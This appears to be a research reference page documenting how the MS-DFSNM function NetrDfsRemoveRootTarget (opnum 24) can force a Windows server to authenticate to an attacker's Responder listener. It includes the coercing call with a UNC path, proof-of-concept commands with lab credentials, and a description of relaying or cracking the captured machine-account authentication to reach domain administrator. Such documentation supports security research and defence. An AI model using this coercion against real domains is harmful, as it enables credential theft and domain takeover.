# MS-DFSNM - Remote call to NetrDfsRemoveRootTarget (opnum 24)

## Summary

+ **Protocol**: [[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)

+ **Function name**: [`NetrDfsRemoveRootTarget`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/1f70f350-439a-4051-a427-eb939e3fce81)

+ **Function operation number**: `24`

+ **RPC Interfaces**:
   + Interface 1:
     - uuid=`4fc742e0-4a10-11cf-8273-00aa004ae673`
     - version=`3.0`
     - Accessible through:
       + SMB Named pipe: `\PIPE\netdfs`

## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\netdfs` and bind to the desired [`MS-DFSNM`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) protocol (with uuid `4fc742e0-4a10-11cf-8273-00aa004ae673` and version `3.0`) in order to perform remote procedure calls to functions in the [`MS-DFSNM`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) protocol.

Note that this protocol refuses an authenticated bind: the association is bound with no RPC-level security and the call runs under the identity of the SMB session established above.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. We will then call the remote [`NetrDfsRemoveRootTarget`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/1f70f350-439a-4051-a427-eb939e3fce81) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
NetrDfsRemoveRootTarget("\\\\192.168.2.51\\share\x00", NULL, 0)
```

As with opnum 23 this is the stand-alone form, where `pTargetPath` is NULL and `pDfsPath` carries the root target host. Nothing is removed — the namespace does not exist — but the target resolves the path on the way to finding that out, and authenticates to the listener while doing so.

We can try this with this proof of concept code ([coerce_poc.py](./poc/python/coerce_poc.py)):

```bash
./poc/python/coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

The same call is implemented in Go ([coerce_poc.go](./poc/go/coerce_poc.go)):

```bash
go run coerce_poc.go --target 192.168.2.1 --listener 192.168.2.51 -d LAB.local -u user1 -p 'Podalirius123!'
```

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`). The call itself fails with `ERROR_BAD_NETPATH (0x00000035)`, which is the expected result of a successful coercion: the target has to reach the UNC path before it can report that it cannot.

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!

## Function technical detail

```cpp
NET_API_STATUS NetrDfsRemoveRootTarget(
   [in, unique, string] LPWSTR pDfsPath,
   [in, unique, string] LPWSTR pTargetPath,
   [in] ULONG Flags
 );
```

+ **pDfsPath**: The pointer to a null-terminated Unicode string. This MUST be `\\<domain>\<dfsname>` for domain-based DFS or `\\<server>\<share>` for stand-alone DFS. The server MUST verify the existence of the DFS namespace this parameter specifies, and returns `ERROR_NOT_FOUND` if that check fails.

+ **pTargetPath**: The pointer to a null-terminated Unicode string. This MUST be `\\<server>\<share>[\<path>]` for domain-based DFS or **NULL** for stand-alone DFS.

+ **Flags**: A bit field specifying the type of removal operation. For a stand-alone namespace this parameter MUST be zero. For a domain-based DFS namespace it can be zero or `DFS_FORCE_REMOVE (0x80000000)`, which removes the root target even if it is not accessible — and so skips the resolution this coercion depends on. All other bits are reserved and MUST NOT be used.

## References

+ Documentation of protocol [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979
